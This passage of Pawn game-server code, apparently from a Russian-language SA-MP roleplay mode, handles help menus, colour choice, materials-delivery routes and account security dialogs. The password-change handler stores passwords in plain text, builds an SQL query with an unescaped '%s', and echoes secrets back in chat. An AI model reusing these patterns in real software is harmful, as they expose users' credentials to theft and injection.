					SCM(playerid,COLOR_CMD," <> /transfer - Перевести деньги со счёта на счёт");
					SCM(playerid,COLOR_CMD," <> /housebank - Перевести деньги со счёта на домашний счёт");
					SCM(playerid,COLOR_CMD," <> /atm - Меню банкомата");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 5:
				{
					SCM(playerid,COLOR_CMD," <> /fixcar - Обновить / Телепортировать автомобиль к дому");
					SCM(playerid,COLOR_CMD," <> /home - Поставить метку у дома (GPS)");
					SCM(playerid,COLOR_CMD," <> /spawnchange - Сменить респавн(возрождение) ДОМ <==> База организации");
					SCM(playerid,COLOR_CMD," <> /healme - Использовать аптечку");
					SCM(playerid,COLOR_CMD," <> /open /enter /exit");
					SCM(playerid,COLOR_CMD," <> /sellhouse /buyhouse");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 6:
				{
					SCM(playerid,COLOR_CMD," <> /buybiz - Купить бизнес");
					SCM(playerid,COLOR_CMD," <> /sellbiz - Продать бизнес");
					SCM(playerid,COLOR_CMD," <> /bizlock - Закрыть / Открыть бизнес");
					SCM(playerid,COLOR_CMD," <> /bizstats /getbizstats - Статистика бизнеса");
					SCM(playerid,COLOR_CMD," <> /bizfee - Установить цену за товар");
					SCM(playerid,COLOR_CMD," <> /bizwithdraw - Снять деньги с бизнеса");
					SCM(playerid,COLOR_CMD," <> /bizbank - Перевести на счёт или оплатить электроэнергию");
					SCM(playerid,COLOR_CMD," <> /bizenterc - Установить цену входа (Только клубам / барам / ресторанам)");
					SCM(playerid,COLOR_CMD," <> /bizmafia - Установить крышу");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 7: SCM(playerid,COLOR_CMD," <> /fish - Меню рыбалки"),CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
			case 8:
				{
					SCM(playerid,COLOR_CMD," <> [Развозчик] /prodmenu");
					SCM(playerid,COLOR_CMD," <> [Хот дог] /hcontract /selleat /hcounter");
					SCM(playerid,COLOR_CMD," <> [Механик] /refill /repair /mcontract");
					SCM(playerid,COLOR_CMD," <> [Такси/Автобус] /fare /route");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 9:
				{
					SCM(playerid,COLOR_CMD," <> /invite - Принять в огранизацию");
					SCM(playerid,COLOR_CMD," <> /uninvite - Выгнать / Уволить из организации");
					SCM(playerid,COLOR_CMD," <> /giverank - Повысить / Понизить ранг в организации");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 10:
				{
					SCM(playerid,COLOR_CMD," <> /newsbank");
					SCM(playerid,COLOR_CMD," <> /ratingnews");
					SCM(playerid,COLOR_CMD," <> /(n)ews");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 11:
				{
					SCM(playerid,COLOR_CMD," <> /tazer");
					SCM(playerid,COLOR_CMD," <> /settax");
					SCM(playerid,COLOR_CMD," <> /gettax");
					SCM(playerid,COLOR_CMD," <> /free");
					SCM(playerid,COLOR_CMD," <> /government");
					SCM(playerid,COLOR_CMD," <> /radio");
					SCM(playerid,COLOR_CMD," <> /departments");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 12:
				{
					SCM(playerid,COLOR_CMD," <> /instopen /duty /itazer");
					SCM(playerid,COLOR_CMD," <> Инструкторам доступно клик меню ([?]двойной клик по нику игрока в ТАБ)");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 13:
				{
					SCM(playerid,COLOR_CMD," <> /ram /take /frisk /tazer");
					SCM(playerid,COLOR_CMD," <> /cuff /follow /uncuff /find /wanted");
					SCM(playerid,COLOR_CMD," <> /clear /ticket /arrest /(gov)ernment");
					SCM(playerid,COLOR_CMD," <> /givecopkeys /(m)egaphone /(r)adio /(d)epartments");
					SCM(playerid,COLOR_CMD," <> /mdc /(su)spect /demote");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 14:
				{
					SCM(playerid,COLOR_CMD," <> [Банды] /gbankput /gbankwithdraw /gbank");
					SCM(playerid,COLOR_CMD," <> [Банды] /selldrugs /sellgun /sellzone /capture /get guns");
					SCM(playerid,COLOR_CMD," <> [Банды] /warehouse /materials /unloading");
					SCM(playerid,COLOR_CMD," <> [Мафии] /tie /untie /mafiawar /бизлист(/bizlist)");
					SCM(playerid,COLOR_CMD," <> [Мафии] /mafiabank /mafiawithdraw /mafiabalance");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 15:
				{
					SCM(playerid,COLOR_CMD," <> /rentcar /unrentcar - Взять на прокат / Вернуть автомобиль");
					SCM(playerid,COLOR_CMD," <> /buycar /sellcar /changecar - Купить / Продать / Передать автомобиль");
					SCM(playerid,COLOR_CMD," <> /fill /fillcar - Заправить автомобиль на заправке или с канистры");
					SCM(playerid,COLOR_CMD," <> /slimit - Вкл / Выкл ограничитель скорости");
					SCM(playerid,COLOR_CMD," <> /carpass - Показать / Посмотреть документы на автомобиль");
					SCM(playerid,COLOR_CMD," <> /lock - Открыть / Закрыть автомобиль");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			}
		}
	case 2001:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: SetPlayerColor(playerid, TEAM_HIT_COLOR);
			case 1: SetPlayerColor(playerid,0x089401FF);
			case 2: SetPlayerColor(playerid,0x56FB4EFF);
			case 3: SetPlayerColor(playerid,0x49E789FF);
			case 4: SetPlayerColor(playerid,0x2A9170FF);
			case 5: SetPlayerColor(playerid,0x9ED201FF);
			case 6: SetPlayerColor(playerid,0x279B1EFF);
			case 7: SetPlayerColor(playerid,0x51964DFF);
			case 8: SetPlayerColor(playerid,0xFF0606FF);
			case 9: SetPlayerColor(playerid,0xFF6600FF);
			case 10: SetPlayerColor(playerid,0xF45000FF);
			case 11: SetPlayerColor(playerid,0xBE8A01FF);
			case 12: SetPlayerColor(playerid,0xB30000FF);
			case 13: SetPlayerColor(playerid,0x954F4FFF);
			case 14: SetPlayerColor(playerid,0xE7961DFF);
			case 15: SetPlayerColor(playerid,0xE6284EFF);
			case 16: SetPlayerColor(playerid,0xFF9DB6FF);
			case 17: SetPlayerColor(playerid,0x110CE7FF);
			case 18: SetPlayerColor(playerid,0x0CD7E7FF);
			case 19: SetPlayerColor(playerid,0x139BECFF);
			case 20: SetPlayerColor(playerid,0x2C9197FF);
			case 21: SetPlayerColor(playerid,0x114D71FF);
			case 22: SetPlayerColor(playerid,0x8813E7FF);
			case 23: SetPlayerColor(playerid,0xB313E7FF);
			case 24: SetPlayerColor(playerid,0x758C9DFF);
			case 25: SetPlayerColor(playerid,0xFFDE24FF);
			case 26: SetPlayerColor(playerid,0xFFEE8AFF);
			case 27: SetPlayerColor(playerid,0xDDB201FF);
			case 28: SetPlayerColor(playerid,0xDDA701FF);
			case 29: SetPlayerColor(playerid,0xB0B000FF);
			case 30: SetPlayerColor(playerid,0x868484FF);
			case 31: SetPlayerColor(playerid,0xB8B6B6FF);
			case 32: SetPlayerColor(playerid,0x333333FF);
			case 33: SetPlayerColor(playerid,0xFAFAFAFF);
			}
		}
	case 1012:
		{
			if(!response) return true;
			if(!strcmp(inputtext, "/time",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /time  - узнать время");
			}
			else if(!strcmp(inputtext, "/gps",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /gps  - навигатор");
			}
			else if(!strcmp(inputtext, "/viphelp",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /viphelp  - помощь по VIP функциям");
			}
			else if(!strcmp(inputtext, "/drink",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /drink  - выпить");
			}
			else if(!strcmp(inputtext, "/directory",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /directory  - справочник");
			}
			else if(!strcmp(inputtext, "/eject",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /eject  - выбросить из машины");
			}
			else if(!strcmp(inputtext, "/dice",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /dice  - бросить кости");
			}
			else if(!strcmp(inputtext, "/clist",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /clist - цвета");
			}
			else if(!strcmp(inputtext, "/usedrugs",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /usedrugs - употребить наркотики");
			}
			else if(!strcmp(inputtext, "/showpass",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /showpass - показать паспорт");
			}
			else if(!strcmp(inputtext, "/myskill",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /myskill - навыки оружия");
			}
			else if(!strcmp(inputtext, "/hi",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /hi - пожать руку");
			}
			else if(!strcmp(inputtext, "/id",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /id - узнать id игрока");
			}
			else if(!strcmp(inputtext, "/ids",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> /ids - узнать id игроков с указанным ником");
			}
			else if(!strcmp(inputtext, "/o",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> (/o)oc - Глобальный чат");
			}
			else if(!strcmp(inputtext, "/ad",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> (/ad)vertise - Объявление");
			}
			else if(!strcmp(inputtext, "/gov",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> (/gov)erment - Государственные новости");
			}
			else if(!strcmp(inputtext, "/f",true))
			{
				SCM(playerid, 0x83BFBFAA, "<> (/f)amily - Чат организации");
			}
			else if(!strcmp(inputtext, "/s",true))
			{
				SCM(playerid,0x83BFBFAA, "<> (/s)hout - Крик");
			}
			else if(!strcmp(inputtext, "/m",true))
			{
				SCM(playerid,0x83BFBFAA, "<> (/m)egaphone - Мегафон на служебном транспорте");
			}
			else if(!strcmp(inputtext, "/r",true))
			{
				SCM(playerid,0x83BFBFAA, "<> (/r)adio - Чат государственных организаций (Полиция/ФБР и т.д)");
			}
			else if(!strcmp(inputtext, "/d",true))
			{
				SCM(playerid,0x83BFBFAA, "<> (/d)epartaments - Общий чат государственных организаций");
			}
			else if(!strcmp(inputtext, "/me",true))
			{
				SCM(playerid,0x83BFBFAA, "<> (/me) - Действие (Пример: Имя_Фамилия пожал руку)");
			}
			else if(!strcmp(inputtext, "/call",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /call - Позвонить (Номер телефона можно узнать через /number)");
			}
			else if(!strcmp(inputtext, "/sms",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /sms - Отправить СМС сообщение");
			}
			else if(!strcmp(inputtext, "/number",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /number - узнать номер игрока");
			}
			else if(!strcmp(inputtext, "/h",true))
			{
				SCM(playerid,0x83BFBFAA, "<> (/h)angup - Завершить телефонный разговор");
			}
			else if(!strcmp(inputtext, "/p",true))
			{
				SCM(playerid,0x83BFBFAA, "<> (/p)ickup - Ответить на звонок");
			}
			else if(!strcmp(inputtext, "/togphone",true))
			{
				SCM(playerid,0x83BFBFAA, "<> togphone - выкл. телефон");
			}
			else if(!strcmp(inputtext, "/hpanel",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /hpanel - Главное меню(Настройки дома)");
			}
			else if(!strcmp(inputtext, "/home",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /home - Поставить метку у дома (GPS)");
			}
			else if(!strcmp(inputtext, "/spawnchange",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /spawnchange - Сменить респавн(Возрождение) ДОМ <==> База организации");
			}
			else if(!strcmp(inputtext, "/healme",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /healme - Использовать аптечку");
			}
			else if(!strcmp(inputtext, "/buybiz",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /buybiz - Купить бизнес");
			}
			else if(!strcmp(inputtext, "/bizstats",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /bizstats - Статистика бизнеса");
			}
			else if(!strcmp(inputtext, "/bizwithdraw ",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /bizwithdraw - Снять деньги с бизнеса");
			}
			else if(!strcmp(inputtext, "/bizfee",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /bizfee - Установить цену за товар");
			}
			else if(!strcmp(inputtext, "/sellbiz",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /sellbiz - Продать бизнес");
			}
			else if(!strcmp(inputtext, "/changehouse",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /changehouse - Продать дом другому человеку или же совершить обмен.");
			}
			else if(!strcmp(inputtext, "/invite",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /invite - Пригласить человека во фракцию");
			}
			else if(!strcmp(inputtext, "/uninvite",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /uninvite - Выгнать человека из фракции");
			}
			else if(!strcmp(inputtext, "/giverank",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /giverank - Повысить/Понизить игрока в ранге");
			}
			else if(!strcmp(inputtext, "/tie",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /tie - Связать заложника. Доступно только мафиям");
			}
			else if(!strcmp(inputtext, "/untie",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /untie - Развязать заложника. Доступно только мафиям");
			}
			else if(!strcmp(inputtext, "/heal",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /heal - Вылечить человека в карете скорой помощи. Доступно только медикам");
			}
			else if(!strcmp(inputtext, "/getgun",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /getgun - Взять оружие со склада мафии");
			}
			else if(!strcmp(inputtext, "/mafiabalance",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /mafiabalance - Проверить счёт мафии в банке");
			}
			else if(!strcmp(inputtext, "/mafiawithdraw",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /mafiawithdraw - Снять деньги со счёта мафии");
			}
			else if(!strcmp(inputtext, "/mafiabank",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /mafiabank - Положить деньги на счёт мафии");
			}
			else if(!strcmp(inputtext, "/ram",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /ram - Выбить дверь. Только законники");
			}
			else if(!strcmp(inputtext, "/cuff",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /cuff - Надеть наручники. Только законники");
			}
			else if(!strcmp(inputtext, "/follow",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /follow - Вести за собой престуника");
			}
			else if(!strcmp(inputtext, "/uncuff",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /uncuff - Снять наручники. Только законники");
			}
			else if(!strcmp(inputtext, "/givecopkeys",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /givecopkeys - Выдать ключи от полицейского участка");
			}
			else if(!strcmp(inputtext, "/arrest",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /arrest - Посадить преступника в камеру. Необходимо находиться в здании тюрьмы");
			}
			else if(!strcmp(inputtext, "/warehouse",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /warehouse - Проверить склад организации");
			}
			else if(!strcmp(inputtext, "/take",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /take - Отобрать у человека запрещённые предметы. Только законники");
			}
			else if(!strcmp(inputtext, "/frisk",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /frisk - Обыскать человека на запрещённые предметы. Только законники");
			}
			else if(!strcmp(inputtext, "/su",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /(su)spect - Добавить человека в список разыскиваемых. Только законники");
			}
			else if(!strcmp(inputtext, "/suspect",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /(su)spect - Добавить человека в список разыскиваемых. Только законники");
			}
			else if(!strcmp(inputtext, "/tazer",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /tazer - Сменить пули");
			}
			else if(!strcmp(inputtext, "/wanted",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /wanted - Посмотреть список разыскиваемых. Только законники");
			}
			else if(!strcmp(inputtext, "/demote",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /demote - Повысить/Понизить законника. Только для ФБР");
			}
			else if(!strcmp(inputtext, "/gbank",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /gbank - Проверить счёт мафии в банке");
			}
			else if(!strcmp(inputtext, "/gbankput",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /gbankput - Положить деньги на счёт банды");
			}
			else if(!strcmp(inputtext, "/gbankwhisdraw",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /gbankwhisdraw - Снять деньги со счёта банды");
			}
			else if(!strcmp(inputtext, "/getbizstats",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /getbizstats - Проверить бизнес");
			}
			else if(!strcmp(inputtext, "/mafiawar",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /mafiawar - Назначить стрелу");
			}
			else if(!strcmp(inputtext, "/fare",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /fare - Начать работу таксистом");
			}
			else if(!strcmp(inputtext, "/mcontract",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /mcontract - Заключить контракт с заправкой. Механики");
			}
			else if(!strcmp(inputtext, "/sellgrib",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /sellgrib - Продать грибы");
			}
			else if(!strcmp(inputtext, "/clear",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /clear - Снять розыск. Только для законников");
			}
			else if(!strcmp(inputtext, "/refill",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /refill - Заправить автомобиль топливом. Для механников");
			}
			else if(!strcmp(inputtext, "/prodmenu",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /prodmenu - Загрузить продукты. Для развозчиков");
			}
			else if(!strcmp(inputtext, "/repair",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /repair - Подчинить повреждённый автомобиль. Для механников");
			}
			else if(!strcmp(inputtext, "/route",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /route - Начать работу водителя автобуса");
			}
			else if(!strcmp(inputtext, "/fixcar",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /fixcar - Отбуксировать домашний автомобиль к дому");
			}
			else if(!strcmp(inputtext, "/newsbank",true))
			{
				SCM(playerid,0x83BFBFAA, "<> /newsbank -  Баланс денежных средств в News");
			}
			return true;
		}
	case 14:
		{
			if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
			if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid,14,DIALOG_STYLE_INPUT, "Введите ключ", "Введите новый ключ безопасности", "Готово", "Назад");
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pKeyip = '%e' WHERE name = '%e'",inputtext,PlayerInfo[playerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
			PlayerInfo[playerid][pCheckip] = 1;
			format(string, 144, " Вы успешно сменили ключ. Ваш новый: %s", inputtext);
			SCM(playerid, 0x2ddd13aa, string);
			return true;
		}
	case 11:
		{
			if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
			if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid,11,DIALOG_STYLE_INPUT, "Смена пароля", "Чтобы не подвергнуть аккаунт взлому, рекомедуем придумать трудный пароль.\nСодержащий набор букв и цифр", "Сменить", "Назад");
			if(strlen(inputtext) < 6 || strlen(inputtext) > 32) return ShowPlayerDialogEx(playerid,11,DIALOG_STYLE_MSGBOX,"Ошибка!","{FF6347}Длина пароля должна быть от 6 до 32","Повтор","");
			strmid(PlayerInfo[playerid][pKey], inputtext, 0, strlen(inputtext), 32);
			mysql_format(DATABASE, QUERY, 150, "UPDATE `"TABLE_ACCOUNTS"` SET pKey = '%s' WHERE name = '%e'", PlayerInfo[playerid][pKey], PlayerInfo[playerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
			format(string, 128, " Вы успешно сменили пароль. Ваш новый: %s", inputtext);
			SCM(playerid, 0x2ddd13aa, string);
			return true;
		}
	case 9653:
		{
			if(!response) return true;
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 19 || proverkaforma[playerid] == 1)
			{
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 433) return SCM(playerid,COLOR_GREY, " Вы не в матовозе!");
				switch(listitem)
				{
				case 0:
					{
						SCM(playerid,COLOR_GREEN, " Встаньте на красный маркер, чтобы заполнить грузовик материалами!");
						SetPlayerCheckpoint(playerid,335.9255,1994.7932,17.6406,8.0);
						MatsArmyCar[playerid]=20;
						return true;
					}
				case 1:
					{
						if(!PlayerToPoint(10.0,playerid,334.9307,1962.9658,17.6406)) return	SCM(playerid,COLOR_GREY, " Вы не у разгрузочной зоны!");
						new tmpcar = GetPlayerVehicleID(playerid);
						if(MatHaul[tmpcar-gunscar[0]][mLoad] <= 0) return SCM(playerid, COLOR_GRAD1, " В матовозе нет оружия!");
						armmatbi += MatHaul[tmpcar-gunscar[0]][mLoad];
						MatHaul[tmpcar-gunscar[0]][mLoad] =0;
						format(string, 144, " Оружие выгружено! В грузовике: %i/10000", MatHaul[tmpcar-gunscar[0]][mLoad]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
				case 2:
					{
						SetPlayerCheckpoint(playerid,2745.2368,-2463.9832,13.6484,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=151;
						return true;
					}
				case 3:
					{
						SetPlayerCheckpoint(playerid,-1601.8774,309.4032,7.1875,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=21;
						return true;
					}
				case 4:
					{
						SetPlayerCheckpoint(playerid,1529.6000,-1691.2000,13.3828,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=31;
						return true;
					}
				case 5:
					{
						SetPlayerCheckpoint(playerid,-2429.1721,490.0948,29.9279,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=24;
						return true;
					}
				case 6:
					{
						SetPlayerCheckpoint(playerid,-1607.2913,683.5955,-5.2422,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=35;
						return true;
					}
				case 7:
					{
						SetPlayerCheckpoint(playerid,2292.0837,2458.9941,10.8203,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=150;
						return true;
					}
				case 8:
					{
						new listitems[] = " [1] Разгрузка The Ballas\n [2] Разгрузка The Vagos\n [3] Разгрузка The Grove\n [4] Разгрузка The Aztec\n [5] Разгрузка The Rifa";
						ShowPlayerDialogEx(playerid, 3232, DIALOG_STYLE_LIST, " Развозка материалов бандам", listitems, "Выбрать", "Отмена");
						return true;
					}
				case 9:
					{
						new listitems[] = " [1] Разгрузка Hell's Angels MC\n [2] Разгрузка Warlocks MC\n [3] Разгрузка Pagans MC";
						ShowPlayerDialogEx(playerid, 3233, DIALOG_STYLE_LIST, " Развозка материалов байкерам", listitems, "Выбрать", "Отмена");
						return true;
					}
				}
			}
		}
	case 3232:
		{
			if(!response) return true;
			if (GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 19 || proverkaforma[playerid] == 1)
			{
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 433) return SCM(playerid,COLOR_GREY, " Вы не в матовозе!");
				switch(listitem)
				{
				case 0:
					{
						SetPlayerCheckpoint(playerid,2645.9717,-2005.8618,13.3828,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=100;
						return true;
					}
				case 1:
					{
						SetPlayerCheckpoint(playerid,2795.7639,-1619.4196,10.9219,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=101;
						return true;
					}
				case 2:
					{
						SetPlayerCheckpoint(playerid,2489.2656,-1670.0692,13.3359,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=102;
						return true;
					}
				case 3:
					{
						SetPlayerCheckpoint(playerid,1806.0304,-2111.7974,13.3828,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=103;
						return true;
					}
				case 4:
					{
						SetPlayerCheckpoint(playerid,2176.5503,-1803.5483,13.3692,6.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=104;
						return true;
					}
				}
			}
		}
	case 3233:
		{
			if(!response) return true;
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 19 || proverkaforma[playerid] == 1)
			{
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 433) return SCM(playerid,COLOR_GREY, " Вы не в матовозе!");
				switch(listitem)
				{
				case 0: //Hell's
					{
						SetPlayerCheckpoint(playerid,681.5627,-473.9190,16.5363,10.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=61;
						return true;
					}
				case 1: // Warlocks
					{
						SetPlayerCheckpoint(playerid,662.8604,1716.4194,7.1875,10.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=63;
						return true;
					}
				case 2:// Pagans
					{
						SetPlayerCheckpoint(playerid,-2105.8921,-2480.8372,30.6250,10.0);
						SCM(playerid, -1, " Метка на карте указана в виде красного маркера");
						MatsArmyCar[playerid]=66;
						return true;
					}
				}
			}
		}
	case 2323:
		{
			if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
			switch(listitem)
			{
			case 0:
				{
					if(PlayerInfo[playerid][pCheckip] == 1)
					{
						PlayerInfo[playerid][pCheckip] = 0;
						SCM(playerid, -1, " Проверка по IP адресу отключена");
						return true;
					}
					if(!PlayerInfo[playerid][pActivemail]) return SCM(playerid,COLOR_GREY," Для начала активируйте e-mail");
					ShowPlayerDialogEx(playerid,14,DIALOG_STYLE_INPUT, "Введите ключ", "У вас не установлен ключ безопасности!\nОт 5 до 16 символов", "Готово", "Назад");
					return true;
				}
			case 1:
				{
					if(!PlayerInfo[playerid][pActivemail]) return SCM(playerid,COLOR_GREY," Для начала активируйте e-mail");
					ShowPlayerDialogEx(playerid,14,DIALOG_STYLE_INPUT, "Сменить ключ", "Введите ваш новый ключ безопасности", "Готово", "Назад");
					return true;
				}
			case 2:
				{
					new rulesdialog[400];
					format(rulesdialog,sizeof(rulesdialog), "%s%s%s%s%s",IPMSG[0],IPMSG[1],IPMSG[2],IPMSG[3],IPMSG[4]);
					ShowPlayerDialogEx(playerid,165,DIALOG_STYLE_MSGBOX, "INFO",rulesdialog, "Готово", "");
				}
			case 3:
				{
				    if(PlayerInfo[playerid][pActivemail] && !GetPVarInt(playerid, "mail_access"))
				    {
						format(string, sizeof(string), "[0] Разблокировать. Получить код\n[1] Разблокировать. Ввести код\n[2] {000000}Указать новый эмэил\n[3] {000000}Подтвердить. Получить код\n[4] {000000}Подтвердить. Ввести код");
					}
					else
					{
					    format(string, sizeof(string), "[0] {000000}Разблокировать. Получить код\n[1] {000000}Разблокировать. Ввести код\n[2] Указать новый эмаил\n[3] Подтвердить. Получить код\n[4] Подтвердить. Ввести код");
					}
					ShowPlayerDialogEx(playerid,35,DIALOG_STYLE_LIST, "Эмаил", string, "Выбрать", "Назад");
					return true;
				}
			case 4:
			    {
			        ShowPlayerDialogEx(playerid, 2324,DIALOG_STYLE_LIST, "Меню", "[0] Сгенерировать ключ\n[1] Отключить", "Выбор", "Назад");
			        return true;
			    }
			}
		}
	case 2324:
	    {
	        if(!response)
	        {
	            ShowPlayerDialogEx(playerid, 2323, DIALOG_STYLE_LIST, "Безопасность", "[1] Вкл / Откл проверку по IP\n[2] Сменить ключ\n[3] Помощь\n[4] Эмаил\n[5] Google Authenticator", "Выбрать", "Назад");
	            return true;
	        }
	        else
	        {
	            if(listitem == 0)
	            {
	                if(PlayerInfo[playerid][pCheckip] == 0) return SCM(playerid, COLOR_LIGHTRED, " Необходимо включить защиту по IP!");
	                ShowPlayerDialogEx(playerid, 2325, DIALOG_STYLE_PASSWORD, "Ввод параметра", "Введите свой основной пароль", "Выбрать", "Назад");
	            }
	            else if(listitem == 1)
	            {
					if(PlayerInfo[playerid][pGoogleIP] == 1)
					ShowPlayerDialogEx(playerid, 2326, DIALOG_STYLE_PASSWORD, "Ввод параметра", "Введите гугл-код", "Выбрать", "Назад");
	            }
	        }
  		}
	case 2325:
	    {
	        if(!response)
	        {
	       		ShowPlayerDialogEx(playerid, 2324,DIALOG_STYLE_LIST, "Меню", "[0] Сгенерировать ключ\n[1] Отключить", "Выбор", "Назад");
	        	return true;
	        }
	        else
	        {
	            
	            if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid, 2325, DIALOG_STYLE_PASSWORD, "Ввод параметра", "Введите свой основной пароль", "Выбрать", "Назад");
	            if(strcmp(inputtext, PlayerInfo[playerid][pKey], false)) return SCM(playerid, COLOR_LIGHTRED, " Вы ввели неверный пароль"), ShowPlayerDialogEx(playerid, 2325, DIALOG_STYLE_PASSWORD, "Ввод параметра", "Введите свой основной пароль", "Выбрать", "Назад");
	            else
	            {
	                new secretkey[17];
	                for(new i = 0; i < 17; i ++) strcat(secretkey, googleauth[random(sizeof(googleauth))]);
	                SetPVarString(playerid, "GoogleKey", secretkey);
					format(string, sizeof(string), "Ваш секретный ключ: %s\nВведите его в программе Google Authenticator\n\nВведите гугл-код для сохранения настроек", secretkey);
